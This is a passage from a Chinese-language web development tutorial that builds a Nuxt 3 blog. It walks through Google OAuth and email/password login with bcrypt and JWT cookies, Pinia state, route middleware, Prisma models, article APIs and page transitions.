36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 import { OAuth2Client } from \u0026#39;google-auth-library\u0026#39; import jwt from \u0026#39;jsonwebtoken\u0026#39; import db from \u0026#39;@/server/db\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const oauth2Client = new OAuth2Client() oauth2Client.setCredentials({ access_token: body.accessToken }) const userInfo = await oauth2Client .request({ url: \u0026#39;https://www.googleapis.com/oauth2/v3/userinfo\u0026#39; }) .then((response) =\u0026gt; response.data) .catch(() =\u0026gt; null) oauth2Client.revokeCredentials() if (!userInfo) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Invalid token\u0026#39; }) } let userRecord = await db.user.getUserByEmail({ email: userInfo.email }) if (userRecord) { if ( (userRecord.providerName === \u0026#39;google\u0026#39; \u0026amp;\u0026amp; userRecord.providerUserId === userInfo.sub) === false ) { throw createError({ statusCode: 400, statusMessage: \u0026#39;This email address does not apply to this login method\u0026#39; }) } } else { userRecord = await db.user.createUser({ providerName: \u0026#39;google\u0026#39;, providerUserId: userInfo.sub, nickname: userInfo.name, email: userInfo.email, password: null, avatar: userInfo.picture, emailVerified: userInfo.email_verified }) } const jwtTokenPayload = { id: userRecord.id } const maxAge = 60 * 60 * 24 * 7 const expires = Math.floor(Date.now() / 1000) + maxAge const jwtToken = jwt.sign( { exp: expires, data: jwtTokenPayload }, runtimeConfig.jwtSignSecret ) setCookie(event, \u0026#39;access_token\u0026#39;, jwtToken, { httpOnly: true, maxAge, expires: new Date(expires * 1000), secure: process.env.NODE_ENV === \u0026#39;production\u0026#39;, path: \u0026#39;/\u0026#39; }) return { id: userRecord.id, provider: { name: userRecord.providerName, userId: userRecord.providerUserId }, nickname: userRecord.nickname, avatar: userRecord.avatar, email: userRecord.email } }) 程式碼內容稍微有一點多，但講解一下流整與概念：\n當前端 Google OAuth 登入成功後，將回傳的 Google access_token 傳送至這隻 API，並使用 Google API 取得使用者資訊。 db.user.getUserByEmail 這個是我封裝的方法，裡面對應著 Prisma 的 ORM 操作，如果你想也可以在這邊替換你的資料庫操作邏輯，主要這個方法，就是依照使用者的 Email 回傳資料庫內是否存在一筆符合的使用者記錄。 如果存在，我會判斷 provider 是否符合 Google 的使用者資訊，否則判斷為應該是用電子信箱註冊的使用者。 如果不存在，則建立一個新的使用者至資料庫內，建立時不需要傳入 id 資料庫因為設定為自動產生 UUID。 最後就是產生使用者的 JWT 並設定在 cookie 之中。 另外，我也實作了使用電子信箱直接註冊的方式，./server/api/auth/register.post.js 程式碼如下：\nserver/api/auth/register.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import bcrypt from \u0026#39;bcrypt\u0026#39; import db from \u0026#39;@/server/db\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) let userRecord = await db.user.getUserByEmail({ email: body.email }) if (userRecord) { throw createError({ statusCode: 400, statusMessage: \u0026#39;A user with that email address already exists\u0026#39; }) } userRecord = await db.user.createUser({ providerName: null, providerUserId: null, nickname: body.nickname, email: body.email, password: bcrypt.hashSync(body.password, 10), avatar: null, emailVerified: false }) return { id: userRecord.id, nickname: userRecord.nickname, email: userRecord.email } }) 使用電子信箱與密碼註冊的流程很簡單，就是判斷是否存在相同信箱的使用者，不存在的話就為它建立一筆紀錄。\n這邊要注意的是，會員系統或牽扯到帳號密碼相關的，請一律使用雜湊演算法，例如 BCrypt 或 Argon2，為使用者的密碼做 Hash，不要再存明碼在資料庫之中囉，以免發生資安事件時，造成不可挽回的悲劇。\n順便也實作一下使用電子信箱與密碼登入的 API，./server/api/auth/login.post.js 程式碼如下：\nserver/api/auth/login.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 import bcrypt from \u0026#39;bcrypt\u0026#39; import jwt from \u0026#39;jsonwebtoken\u0026#39; import db from \u0026#39;@/server/db\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const userRecord = await db.user.getUserByEmail({ email: body.email }) if (!userRecord) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Email or password is incorrect\u0026#39; }) } if ((await bcrypt.compare(body.password, userRecord.password)) !== true) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Email or password is incorrect\u0026#39; }) } const jwtTokenPayload = { id: userRecord.id } const maxAge = 60 * 60 * 24 * 7 const expires = Math.floor(Date.now() / 1000) + maxAge const jwtToken = jwt.sign( { exp: expires, data: jwtTokenPayload }, runtimeConfig.jwtSignSecret ) setCookie(event, \u0026#39;access_token\u0026#39;, jwtToken, { httpOnly: true, maxAge, expires: new Date(expires * 1000), secure: process.env.NODE_ENV === \u0026#39;production\u0026#39;, path: \u0026#39;/\u0026#39; }) return { id: userRecord.id, provider: { name: userRecord.providerName, userId: userRecord.providerUserId }, nickname: userRecord.nickname, avatar: userRecord.avatar, email: userRecord.email } }) 使用 Google OAuth 登入 使用電子信箱與密碼登入 結合 Pinia 儲存使用者資料 我們可以結合 Pinia 來將使用者的資料持久話儲存在 Local Storage 之中，這樣就可以在前端儲存使用者登入的狀態，例如導覽列的頭像、信箱，就可以從 Store 中拿出來囉。\n建立 ./server/profile.get.js 檔案，用來取得使用者資料：\nserver/profile.get.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 import jwt from \u0026#39;jsonwebtoken\u0026#39; import db from \u0026#39;@/server/db\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler(async (event) =\u0026gt; { const jwtToken = getCookie(event, \u0026#39;access_token\u0026#39;) let userInfo = null try { const { data } = jwt.verify(jwtToken, runtimeConfig.jwtSignSecret) userInfo = data } catch (e) { throw createError({ statusCode: 401, statusMessage: \u0026#39;Unauthorized\u0026#39; }) } if (!userInfo?.id) { throw createError({ statusCode: 401, statusMessage: \u0026#39;Unauthorized\u0026#39; }) } const userRecord = await db.user.getUserById({ id: userInfo.id }) if (!userRecord) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Could not find user.\u0026#39; }) } return { id: userRecord.id, provider: { name: userRecord.providerName, userId: userRecord.providerUserId }, nickname: userRecord.nickname, avatar: userRecord.avatar, email: userRecord.email } }) 新增一個 user 的 store，./stores/user.js 內容如下：\nstores/user.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import { defineStore } from \u0026#39;pinia\u0026#39; export const useUserStore = defineStore(\u0026#39;user\u0026#39;, { state: () =\u0026gt; ({ profile: { id: null, provider: { name: null, userId: null }, nickname: null, avatar: null, email: null } }), actions: { async refreshUserProfile() { const { data, error } = await useFetch(\u0026#39;/api/user/profile\u0026#39;, { initialCache: false }) if (data.value) { this.profile = data.value } else { return error.value?.data?.message ?? \u0026#39;未知錯誤\u0026#39; } } }, persist: { enabled: true, strategies: [ { key: \u0026#39;user\u0026#39;, storage: process.client ? localStorage : null } ] } }) 我們就可以直接使用 refreshUserProfile() 來發送請求至 /api/user/profile 取得最新的使用者資料來更新 store。\n1 2 3 4 import { useUserStore } from \u0026#39;@/stores/user\u0026#39; const userStore = useUserStore() userStore.refreshUserProfile() 使用伺服器中間件來驗證 JWT 我們的會員系統在登入後，會產生一組 JWT 放置於 cookie 之中，在後端 API 使用時都要在呼叫 getCookie() 來解析 cookie，所以我們可以將驗證 JWT 的流程，放置在伺服器中間件 (middleware) 之中，後端收到的每個請求就會經過這個中間件，只要有夾帶 access_token 的 cookie 就會進行驗證解析出 JWT 所含的 payload id，即為使用者的 ID。\n建立 ./server/middleware/auth.js 檔案，內容如下：\nserver/middleware/auth.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import jwt from \u0026#39;jsonwebtoken\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler((event) =\u0026gt; { const jwtToken = getCookie(event, \u0026#39;access_token\u0026#39;) if (!jwtToken) { return } let userInfo = null try { const { data } = jwt.verify(jwtToken, runtimeConfig.jwtSignSecret) userInfo = data if (userInfo?.id) { event.context.auth = { user: { id: userInfo.id } } } } catch (e) { console.error(\u0026#39;Invalid token\u0026#39;) } }) 伺服器的中間件只要定義在 ./server/middleware 目錄下就會自動被載入，之後在每個 Server API 收到請求，中間件只要有成功驗證並解析 JWT，就會在 event.context.auth 添加使用者資訊，之後在 Server API 的處理函數中，就可以以下列程式碼進行使用。\n1 2 3 export default defineEventHandler(async (event) =\u0026gt; { const user = event.context?.auth?.user }) 調整後的 ./server/profile.get.js 檔案，就會乾淨許多囉！\nserver/profile.get.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import db from \u0026#39;@/server/db\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const user = event.context?.auth?.user if (!user?.id) { throw createError({ statusCode: 401, statusMessage: \u0026#39;Unauthorized\u0026#39; }) } const userRecord = await db.user.getUserById({ id: user.id }) if (!userRecord) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Could not find user.\u0026#39; }) } return { id: userRecord.id, provider: { name: userRecord.providerName, userId: userRecord.providerUserId }, nickname: userRecord.nickname, avatar: userRecord.avatar, email: userRecord.email } }) 為了實作部落格，我們使用 Prisma 快速的建立資料庫環境，也方便大家可以下載範例程式碼，就可以在自己的電腦上運作 SQLite。也結合 Pinia 來將使用者的資料進行持久化的儲存，這樣我們就可以實作出如判斷使用者是否登入或是建立導覽列上的登入狀態。\n範例程式碼 - Nuxt 3 - 實作部落格資料庫與會員系統\n導覽列模板與新增文章 上面我們完成了基本的會員登入，接下來將進入網站的切版，以下會使用布局模板來實現，上方導覽列與下方顯示網站內容的排版方式，接下來就會快速的進入到新增一篇部落格的文章，該如何實現 Server API 與前端進行串接。\n預設布局模板 首先，建立一個預設布局模板，我們預計使每個頁面於上方顯示導覽列，下方則是依據不同的頁面來顯示，大概如下所示。\n1 2 3 4 5 6 7 8 9 10 11 +---------------------------+ | +-----------------------+ | | | 導覽列 | | | +-----------------------+ | | +-----------------------+ | | | 不同頁面的內容顯示的位置 | | | | | | | | | | | | | | | +-----------------------+ | +---------------------------+ 我們可以建立一個 default.vue 於 layouts 目錄中，作為預設的佈局模板，模板內約會實作下面的程式碼：\n1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;header\u0026gt; \u0026lt;!-- 導覽列 --\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;header\u0026gt; 裡面就是我們可以實作導覽列的位置，下方的 \u0026lt;slot /\u0026gt; 插槽，即會是我們可以放置頁面的容器。\n完整的 ./layouts/default.vue 程式碼如下：\nlayouts/default.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;header class=\u0026#34;flex w-full justify-center px-8 xl:px-0\u0026#34;\u0026gt; \u0026lt;nav class=\u0026#34;flex w-full max-w-7xl items-center justify-between py-2\u0026#34;\u0026gt; \u0026lt;div\u0026gt; \u0026lt;a aria-label=\u0026#34;TailwindBlog\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex items-center justify-between\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-3\u0026#34;\u0026gt; \u0026lt;Icon class=\u0026#34;h-12 w-12\u0026#34; name=\u0026#34;logos:nuxt-icon\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;hidden h-6 text-2xl font-semibold text-gray-700 sm:block\u0026#34;\u0026gt; Nuxt 3 Blog \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;flex items-center text-base leading-5\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-row items-center\u0026#34;\u0026gt; \u0026lt;NuxtLink class=\u0026#34;px-3 py-2 text-gray-700 transition hover:text-emerald-500\u0026#34; to=\u0026#34;/login\u0026#34; \u0026gt; 登入 \u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useUserStore } from \u0026#39;@/stores/user\u0026#39; const userStore = useUserStore() const userProfile = computed(() =\u0026gt; userStore.profile) \u0026lt;/script\u0026gt; 接著記得調整 app.vue 內容，添加一個 \u0026lt;NuxtLayout\u0026gt; 元件來顯示預設的布局模板，包裹著的 \u0026lt;NuxtPage /\u0026gt; 即會放置於 default.vue 預設插槽之中，如此就能顯示路由的頁面。\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;NuxtLayout\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/template\u0026gt; 至此，我們就完成的第一個導覽列，可以由導覽列提供的「登入」，切換至登入頁面，並且在每個頁面中，都使用預設的布局模板，所以都會顯示導覽列。\n取消或替換特定頁面的布局模板 在【Nuxt3】開箱即用的 Nuxt3 玩轉筆記 - Nuxt 3 布局模板 (Layouts) 內有介紹到，我們可以建立多個布局模板，而 Nuxt 也提供我們可以為頁面元件取消使用或選擇特定的布局模板。\n例如，我們想將登入與註冊頁面，取消套用預設的布局模板，我們就可以使用 definePageMeta() 來傳入 layout: false 屬性來取消布局模板的使用。\n調整登入頁面 ./pages/login.vue\npages/login.vue 1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; // ... definePageMeta({ layout: false }) \u0026lt;/script\u0026gt; 如此一來，登入頁面將不會使用布局模板，導覽列也就不會顯示。\n建立使用者選單 為了豐富導覽列，我們可以為已登入的使用者，建立一個使用者頭像，點擊後可以顯示使用者專用的選項，例如登出等功能。\n安裝 headless UI 我們的使用的是 Tailwind CSS 來做樣式的處理，headless UI 已經封裝一些實用且好看的元件，元件基於 Tailwind CSS 可以讓我們的風格更一致，也能更彈性的自訂成自己喜歡的樣式。\n使用 NPM 安裝 @headlessui/vue：\n1 2 3 npm install -D @headlessui/vue # or # yarn add -D @headlessui/vue 調整 nuxt.config.ts，將 @headlessui/vue 新增至 build.transpile 屬性之中。\nnuxt.config.ts 1 2 3 4 5 export default defineNuxtConfig({ build: { transpile: [\u0026#39;@headlessui/vue\u0026#39;] } }) 建立使用者頭像選單元件 新增 ./components/NavigationBar/NavigationBarAvatarMenu.vue 內容如下：\ncomponents/NavigationBar/NavigationBarAvatarMenu.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;Menu as=\u0026#34;div\u0026#34; class=\u0026#34;relative inline-block text-left\u0026#34;\u0026gt; \u0026lt;div\u0026gt; \u0026lt;MenuButton class=\u0026#34;inline-flex w-full justify-center\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;inline-block h-10 w-10 rounded-full bg-white/90 object-cover object-center p-0.5 shadow-lg shadow-zinc-800/5 ring-1 ring-zinc-900/5 backdrop-blur hover:bg-opacity-30 focus:outline-none focus-visible:ring-2 focus-visible:ring-white focus-visible:ring-opacity-75\u0026#34; src=\u0026#34;https://images.unsplash.com/photo-1577023311546-cdc07a8454d9?ixlib=rb-1.2.1\u0026amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=128\u0026amp;q=80\u0026#34; alt=\u0026#34;使用者選單\u0026#34; /\u0026gt; \u0026lt;/MenuButton\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;transition enter-active-class=\u0026#34;transition duration-100 ease-out\u0026#34; enter-from-class=\u0026#34;transform scale-95 opacity-0\u0026#34; enter-to-class=\u0026#34;transform scale-100 opacity-100\u0026#34; leave-active-class=\u0026#34;transition duration-75 ease-in\u0026#34; leave-from-class=\u0026#34;transform scale-100 opacity-100\u0026#34; leave-to-class=\u0026#34;transform scale-95 opacity-0\u0026#34; \u0026gt; \u0026lt;MenuItems class=\u0026#34;absolute right-0 mt-2 w-56 origin-top-right divide-y divide-gray-100 rounded-md bg-white shadow-lg ring-1 ring-black ring-opacity-5 focus:outline-none\u0026#34; \u0026gt; \u0026lt;div class=\u0026#34;px-1 py-1\u0026#34;\u0026gt; \u0026lt;MenuItem v-slot=\u0026#34;{ active }\u0026#34;\u0026gt; \u0026lt;button :class=\u0026#34;[ active ? \u0026#39;bg-emerald-500 text-white\u0026#39; : \u0026#39;text-gray-900\u0026#39;, \u0026#39;group flex w-full items-center rounded-md px-2 py-2 text-sm\u0026#39; ]\u0026#34; \u0026gt; \u0026lt;Icon :active=\u0026#34;active\u0026#34; class=\u0026#34;mr-2 h-5 w-5 text-emerald-400\u0026#34; name=\u0026#34;ri:logout-box-line\u0026#34; aria-hidden=\u0026#34;true\u0026#34; /\u0026gt; 登出 \u0026lt;/button\u0026gt; \u0026lt;/MenuItem\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/MenuItems\u0026gt; \u0026lt;/transition\u0026gt; \u0026lt;/Menu\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { Menu, MenuButton, MenuItems, MenuItem } from \u0026#39;@headlessui/vue\u0026#39; \u0026lt;/script\u0026gt; 將 \u0026lt;NavigationBarAvatarMenu\u0026gt; 元件添加至導覽列之中，我們就可以擁有一個使用者頭像的選單囉。\n結合使用者 Store 來控制顯示的時機 使用者頭像選單的元件應該控制於使用者登入之後再顯示，所以我們可以結合 Pinia 進行狀態管理，來檢查使用者資訊的 store 是否具有資料且符合我們的判定依據再進行顯示，否則，我們僅需要渲染出登入的按鈕即可。\n例如，我們從 User Store 取出使用者資訊 (Profile)，並判斷是否有 id 來決定要顯示使用者頭像選單或登入。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ClientOnly\u0026gt; \u0026lt;NavigationBarAvatarMenu v-if=\u0026#34;userProfile?.id\u0026#34; /\u0026gt; \u0026lt;NuxtLink v-else class=\u0026#34;px-3 py-2 text-gray-700 transition hover:text-emerald-500\u0026#34; to=\u0026#34;/login\u0026#34; \u0026gt; 登入 \u0026lt;/NuxtLink\u0026gt; \u0026lt;/ClientOnly\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useUserStore } from \u0026#39;@/stores/user\u0026#39; const userStore = useUserStore() const userProfile = computed(() =\u0026gt; userStore.profile) \u0026lt;/script\u0026gt; 整個完成後，介面看起來就會比較乾淨也符合登入與未登入時，應該顯示的介面樣子。\n新增部落格文章 當我們處理好登入後，就開可以開始來實作使用者建立部落格的文章囉！\n建立文章資料表 我們的資料庫，是透過 Prisma 的 Schema 來自動產生資料表，我們可以建立如下的 Schema，來作為儲存文章內容的資料表。\n1 2 3 4 5 6 7 8 9 10 model Article { id Int @id @default(autoincrement()) title String content String cover String tags String authorId String? createdAt DateTime @default(now()) updatedAt DateTime @updatedAt } 欄位相對簡單，各個欄位的用途與說明如下：\nid: 文章的 ID，採用自動遞增的數字。 title: 文章的標題。 content: 文章的內容。 cover: 文章的封面圖片。 tags: 文章的標籤。 authorId: 對應 User 資料表的 id 欄位，表示文章的作者。 createdAt: 文章建立時間，預設為插入該筆資料的時間。 updatedAt: 使用者更新文章資料的時間，預設為更新該筆資料的時間。 另外，我想讓 Article 具有關聯性，所以我們可以使用 Prisma 提供的語法，來建立與 User 的外鍵 (Foreign Key)，最後完整的 schema.prisma 如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // This is your Prisma schema file, // learn more about it in the docs: https://pris.ly/d/prisma-schema generator client { provider = \u0026#34;prisma-client-js\u0026#34; } datasource db { provider = \u0026#34;sqlite\u0026#34; url = \u0026#34;file:./dev.db\u0026#34; } model User { id String @id @default(uuid()) providerName String? providerUserId String? nickname String @default(\u0026#34;User\u0026#34;) email String @unique password String? avatar String? emailVerified Boolean @default(false) createdAt DateTime @default(now()) updatedAt DateTime @updatedAt Article Article[] } model Article { id Int @id @default(autoincrement()) title String content String cover String tags String authorId String? createdAt DateTime @default(now()) updatedAt DateTime @updatedAt User User? @relation(fields: [authorId], references: [id]) } 記得執行以下指令，來讓 Prisma 建立新的資料表。\n1 npx prisma db push 建立新增文章的 API 建立 ./server/api/manage/articles.post.js，內容如下：\nserver/api/manage/articles.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import db from \u0026#39;@/server/db\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const user = event.context?.auth?.user if (!user?.id) { throw createError({ statusCode: 401, statusMessage: \u0026#39;Unauthorized\u0026#39; }) } const body = await readBody(event) const authorId = user.id const articleRecord = await db.article.createArticle({ title: body.title, content: body.content, cover: body.cover, tags: body.tags, authorId }) if (!articleRecord) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Create article failed. Please try again later.\u0026#39; }) } return articleRecord }) 整個 Server API 的運作流程如下：\n使用者將欲新增的文章資料以 POST 發送至 /api/manage/article，伺服器中間件，將會解析 JWT 來得到 user。 判斷 user.id 來決定是否具有權限，如果正確解析 JWT，表示請求為一個已登入的使用者發送，也將放行給予新增文章。 處理函數將解析 Body 內的資料，並建構出往資料庫新增文章記錄的內容。 判斷是否新增成功，回傳新增的文章資料。 建立文章的 Prisma Client 操作如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 async createArticle(options) { const articleRecord = await prisma.article .create({ data: { title: options.title, content: options.content, cover: options.cover, tags: options.tags, authorId: options.authorId } }) .catch((error) =\u0026gt; { console.error(error) throw createError({ statusCode: 500, statusMessage: \u0026#39;Could not create article. Please try again later.\u0026#39; }) }) return articleRecord } 我們就完成了建立文章的 API 囉！\n取得部落格文章 使用 Prisma Client 來取得文章，也非常方便，如下程式碼，我們就能取出文章資料並以建立時間遞減排序囉！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 async getArticles(options = {}) { const articleRecords = await prisma.article .findMany({ orderBy: { createdAt: \u0026#39;desc\u0026#39; }, skip: options.pageSize ? options.page * options.pageSize : undefined, take: options.pageSize }) .catch((error) =\u0026gt; { console.error(error) throw createError({ statusCode: 500, statusMessage: \u0026#39;Could not create user. Please try again later.\u0026#39; }) }) return articleRecords } ./server/api/articles.get.js 是實作取得文章的 API，我們期望任何人都可以瀏覽這個部落格的文章，所以這隻 API 我們無需驗證使用者即可放行，程式碼如下：\nserver/api/articles.get.js 1 2 3 4 5 6 7 import db from \u0026#39;@/server/db\u0026#39; export default defineEventHandler(async () =\u0026gt; { const articlesRecord = await db.article.getArticles() return articlesRecord }) 我們也可以在 ./server/api/articles.get.js 處理函數內，添加資料的分頁或為文章資料進行加工，以利前端顯示。\n我們建立好了部落個的版面，有了導覽列和使用者選單，網站看起來也更專業了一些，結合布局模板，我們可以控制每個頁面所顯示的布局，在未來有更多頁面的時候能具有可控性。最後也實作了新增文章的 API，完成了第一篇文章的新增與瀏覽。\n頁面的導航守衛與切換效果 我們完成了新增文章的頁面與流程，在網站開發的過程中，有些頁面是具有瀏覽的限制，例如，我們不希望一般的使用者能進到管理者頁面專用的頁面進行操作，這時候我們就需要做一些權限的驗證與限制，在 Nuxt 的頁面提供了路由中間件可以在我們導航至頁面之前，執行一些處理函數，就實作導航守衛 (Navigations Guards) 的效果。最後會介紹一下在 Nuxt 3 所提供的頁面和布局切換時的進度條 (Progress bar) 與轉場效果 (Transitions)。\n頁面間的導航守衛 只允許已登入使用者新增文章 首先，我們新增一個路由中間件 ./middleware/manage-auth.js 內容如下：\nmiddleware/manage-auth.js 1 2 3 4 5 6 7 8 9 10 11 12 13 import { useUserStore } from \u0026#39;@/stores/user\u0026#39; export default defineNuxtRouteMiddleware(() =\u0026gt; { if (process.client) { const userStore = useUserStore() if (!userStore.profile?.id) { return navigateTo(\u0026#39;/login\u0026#39;) } } else { return navigateTo(\u0026#39;/\u0026#39;) } }) 在頁面元件中使用 definePageMeta() 來套用 manage-auth 中間件。調整 ./pages/manage/articles/create.vue 內容：\npages/manage/articles/create.vue 1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; // ... definePageMeta({ middleware: \u0026#39;manage-auth\u0026#39; }) \u0026lt;/script\u0026gt; 我們首頁新增一個可以導向至 /manage/articles/create 頁面的按鈕。\n1 2 3 4 5 6 \u0026lt;NuxtLink class=\u0026#34;text-md mt-12 rounded-sm bg-emerald-500 py-2 px-4 font-medium text-white hover:bg-emerald-600 focus:outline-none focus:ring-2 focus:ring-emerald-400 focus:ring-offset-2\u0026#34; to=\u0026#34;/manage/articles/create\u0026#34; \u0026gt; 前往撰寫文章 \u0026lt;/NuxtLink\u0026gt; 當我們處於未登入的情況，點擊前往後，會經由中間件判斷 process.client 是否是在客戶端，進而從 User Store 取出使用者資訊進行判斷，當不存在 userStore.profile.id 時，表示未登入，我們將導航至登入頁面 /login；當登入完成後，就可以使用按鈕成功導航至新增文章的頁面。如果 process.client 為 false，表示導航是在伺服器端觸發的，例如，我們直接透過網址進入新增文章頁面，將會一律被重新導航至首頁。\n登入完成後導回至登入前瀏覽的頁面 當使用者在瀏覽網站時被引導或準備登入時，我們可以將使用者目前的頁面進行記錄，以便登入完成後，可以重新導向至使用者登入前的頁面，以此提供使用者更棒的體驗。\n首先，我們新增一個路由中間件 ./middleware/logged-in-redirect.js 內容如下：\nmiddleware/logged-in-redirect.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 export default defineNuxtRouteMiddleware((to, from) =\u0026gt; { if (from \u0026amp;\u0026amp; to.path !== from.path \u0026amp;\u0026amp; !to.query.redirect_to) { let redirectTo = null if (from.query.redirect_to) { redirectTo = from.query.redirect_to from.query.redirect_to = undefined } else { redirectTo = from.fullPath } to.query.redirect_to = redirectTo return navigateTo(to) } }) 這個 logged-in-redirect 中間件的處理邏輯，我們接收 to 與 from，分別為目標頁面與來源頁面，當使用者目標頁面 /login 還未帶上了 Query 參數 redirect_to，我們就將來源的完整路徑添加上去 from.fullPath，最後進行導向。\n這裡需要進行判斷 redirect_to，否則會重複發生重新導向。\n在登入頁面中使用 definePageMeta() 來套用 logged-in-redirect 中間件。調整 ./pages/login.vue 內容：\npages/login.vue 1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; // ... definePageMeta({ middleware: \u0026#39;logged-in-redirect\u0026#39; }) \u0026lt;/script\u0026gt; 在登入完成的地方，我們就可以使用 navigateTo() 導向至 redirect_to 給的頁面路徑。\n1 2 3 4 5 6 7 8 9 \u0026lt;script setup\u0026gt; const route = useRoute() const handleEmailLogin = async () =\u0026gt; { // ... navigateTo(route.query.redirect_to ?? \u0026#39;/\u0026#39;) } \u0026lt;/script\u0026gt; 完成後，我們從首頁點擊登入後．當登入完成後就會導向回首頁；而從文章頁面點擊登入，完成後則會導向回文章頁面。\n頁面載入進度元件 Nuxt 3 提供一個 \u0026lt;NuxtLoadingIndicator\u0026gt; 元件，用作頁面導航後顯示載入的進度，會在頁面上方有一個進度條 (Progress bar)。\n只需要將 \u0026lt;NuxtLoadingIndicator\u0026gt; 元件添加至 app.vue 或布局之中，調整 app.vue 內容如下：\napp.vue 1 2 3 4 5 6 \u0026lt;template\u0026gt; \u0026lt;NuxtLayout\u0026gt; \u0026lt;NuxtLoadingIndicator /\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/template\u0026gt; 元件可以傳入的屬性 (Props) 如下：\ncolor：進度條的顏色，可以傳入CSS 支援的色碼或 repeating-linear-gradient() 函数，預設為 repeating-linear-gradient(to right,#00dc82 0%,#34cdfe 50%,#0047e1 100%)。 height：進度條的高度數值，單位： px，預設值為 3。 duration：進度條載入的持續時間，單位： 毫秒，預設值為 2000。 throttle：進度條的隱藏與顯示，限制在特定時間內僅觸發一次，單位： 毫秒，預設值為 200。 當我們從首頁切換頁面時，網頁上方就會出現一個進度條，表示頁面正在載入中。\n頁面切換的轉場效果 除了載入的進度條，頁面切換之間，也可以使用轉場效果 (Transitions) 來讓頁面之間的銜接更柔順，Nuxt 利用了 Vue 內建的 \u0026lt;Transition\u0026gt; 元件來幫助處理轉場和動畫，用以響應不斷變化的頁面與狀態。\nNuxt 預設為所有頁面 (Pages) 都設置了轉場，如果要啟用，請將以下 CSS 添加至 app.vue 中：\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 